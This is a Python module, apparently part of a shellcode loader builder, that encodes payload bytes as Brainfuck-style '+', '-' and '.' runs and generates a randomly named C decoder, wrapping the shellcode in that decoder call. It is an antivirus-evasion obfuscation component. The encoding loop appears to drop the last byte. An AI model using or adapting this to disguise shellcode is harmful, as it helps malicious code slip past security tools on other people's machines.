import random
import string

class Brainfuck:

    def __init__(self):
        self.name = ''.join(random.SystemRandom().choice(string.ascii_uppercase) for _ in range(16))

    def imports(self):
        return []

    def codeblock(self):
        return """
unsigned char * {name}(unsigned char *encoded)
{{
    unsigned char *out = calloc({size}, sizeof(unsigned char));
    unsigned char *stack = calloc(10, sizeof(unsigned char));
    int stackPointer = 0;
    int outIndex = 0;
    int instructionPointer = 0;
    int bracketCount = 0;
    while (instructionPointer < {len} - 1){{
        switch(encoded[instructionPointer]){{
            case '>': 
                stackPointer++; 
                break;
            case '<': 
                stackPointer--; 
                break;
            case '+': 
                stack[stackPointer]++; 
                break;
            case '-':
                stack[stackPointer]--;
                break;
            case '.':
                out[outIndex] = stack[stackPointer];
                outIndex++;
                break;
            case '[':
                if (stack[stackPointer] == 0){{
                    while (1){{
                        instructionPointer++;
                        if (encoded[instructionPointer] == ']' && bracketCount == 0){{
                            break;
                        }}
                        if (encoded[instructionPointer] == '['){{
                            bracketCount++;
                        }} else if (encoded[instructionPointer] == ']'){{
                            bracketCount--;
                        }}
                    }}
                }}
                break;
            case ']':
                if (stack[stackPointer] != 0){{
                    while (1){{
                        instructionPointer--;
                        if (encoded[instructionPointer] == '[' && bracketCount == 0){{
                            break;
                        }}
                        if (encoded[instructionPointer] == ']'){{
                            bracketCount++;
                        }} else if (encoded[instructionPointer] == '['){{
                            bracketCount--;
                        }}
                    }}
                }}
                break;
        }}
        instructionPointer++;
    }}

    return out;
}}
""".format(name = self.name, size = self.size, len=self.len)
    
    def compilerOptions(self):
        return []

    def obfuscate(self, decoded):
        self.size = len(decoded)
        encoded = '+' * decoded[0] + '.'
        for i in range(1, len(decoded) - 1):
            delta = decoded[i] - decoded[i - 1]
            if delta < 0:
                encoded += '-'*abs(delta) + '.'
            else:
                encoded += '+'*delta + '.'
        self.len = len(encoded)
        return encoded

    def transformer(self, shellcodestring):
        return shellcodestring.format(shellcode=f'{self.name}({{shellcode}})')